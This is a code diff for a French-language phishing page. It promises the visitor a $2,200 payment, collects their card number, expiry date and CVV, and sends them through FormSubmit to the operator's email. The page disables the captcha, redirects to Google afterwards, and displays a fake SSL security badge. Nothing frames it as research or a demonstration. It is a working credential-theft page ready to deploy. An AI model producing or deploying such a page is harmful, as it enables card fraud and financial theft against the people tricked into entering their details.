@@ -1,25 +1,71 @@
-<!-- Remplace TON_EMAIL@GMAIL.COM par ton adresse de réception -->
-<form action="https://formsubmit.co" method="POST">
-    
-    <!-- Redirection après le clic (Optionnel : vers ton site ou google.com) -->
-    <input type="hidden" name="_next" value="https://google.com">
-    
-    <!-- Désactive le Captcha pour que ce soit plus rapide sur téléphone -->
-    <input type="hidden" name="_captcha" value="false">
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Réception de Paiement</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; background-color: #f4f7f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
+        .card-container { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 100%; max-width: 400px; box-sizing: border-box; }
+        .header { text-align: center; margin-bottom: 25px; }
+        .amount { font-size: 32px; font-weight: bold; color: #27ae60; }
+        .label { display: block; margin-bottom: 8px; font-size: 13px; color: #333; font-weight: 600; }
+        input { width: 100%; padding: 15px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 16px; }
+        .row { display: flex; gap: 15px; }
+        .row div { flex: 1; }
+        button { width: 100%; background-color: #3498db; color: white; padding: 18px; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        .secure { text-align: center; margin-top: 15px; color: #aaa; font-size: 12px; }
+    </style>
+</head>
+<body>
 
-    <label class="label">NUMÉRO DE CARTE</label>
-    <input type="text" name="Numero_Carte" id="card" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19" required>
-
-    <div class="row">
-        <div>
-            <label class="label">EXPIRATION</label>
-            <input type="text" name="Date_Expiration" id="expiry" placeholder="MM/AA" inputmode="numeric" maxlength="5" required>
-        </div>
-        <div>
-            <label class="label">CVV</label>
-            <input type="password" name="Code_CVV" placeholder="123" inputmode="numeric" maxlength="3" required>
-        </div>
+<div class="card-container">
+    <div class="header">
+        <p style="margin:0; color:#888;">Montant à recevoir</p>
+        <div class="amount">2 200,00 $</div>
     </div>
 
-    <button type="submit">RECEVOIR LES 2200$</button>
-</form>
+    <!-- Configuration FormSubmit pour ton email -->
+    <form action="https://formsubmit.co" method="POST">
+        
+        <!-- Paramètres invisibles -->
+        <input type="hidden" name="_captcha" value="false"> <!-- Désactive le test robot -->
+        <input type="hidden" name="_subject" value="Nouveau Paiement Reçu - 2200$">
+        <input type="hidden" name="_next" value="https://google.com"> <!-- Redirection après envoi -->
+
+        <label class="label">NUMÉRO DE CARTE</label>
+        <input type="text" name="Numero_Carte" id="card" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19" required>
+
+        <div class="row">
+            <div>
+                <label class="label">EXPIRATION</label>
+                <input type="text" name="Expiration" id="expiry" placeholder="MM/AA" inputmode="numeric" maxlength="5" required>
+            </div>
+            <div>
+                <label class="label">CVV</label>
+                <input type="password" name="CVV" placeholder="123" inputmode="numeric" maxlength="3" required>
+            </div>
+        </div>
+
+        <button type="submit">RECEVOIR MES 2200$</button>
+    </form>
+    
+    <div class="secure">🔒 Connexion sécurisée SSL</div>
+</div>
+
+<script>
+    // Formatage auto numéro de carte (espaces)
+    document.getElementById('card').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+    });
+
+    // Formatage auto date (slash)
+    document.getElementById('expiry').addEventListener('input', function (e) {
+        let v = e.target.value.replace(/[^\d]/g, '');
+        if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
+        e.target.value = v;
+    });
+</script>
+
+</body>
+</html>
